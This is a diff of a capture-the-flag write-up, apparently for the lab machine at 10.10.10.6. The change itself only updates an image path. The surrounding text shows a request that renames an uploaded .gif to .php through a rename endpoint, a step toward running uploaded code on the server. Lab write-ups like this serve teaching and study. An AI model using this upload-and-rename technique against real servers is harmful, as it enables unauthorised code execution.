@@ -392,7 +392,7 @@ That didn't work. Let's try the following:
 
 [http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/torrent/upload/](http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/torrent/upload/a.php)[00b21cf92b5c30cff62a126154c23571979a4cab](http://10.10.10.6/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif)[.php](http://10.10.10.6/rename/index.php?filename=/var/www/html/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/html/torrent/upload/a.php)
 
-![](<../../.gitbook/assets/9 (1) (1).JPG>)
+![](<../../.gitbook/assets/9 (1) (1) (1).JPG>)
 
 That seems to have worked. Let's check the [http://10.10.10.6/torrent/upload/](http://10.10.10.6/torrent/upload/?C=N;O=A) page:
 
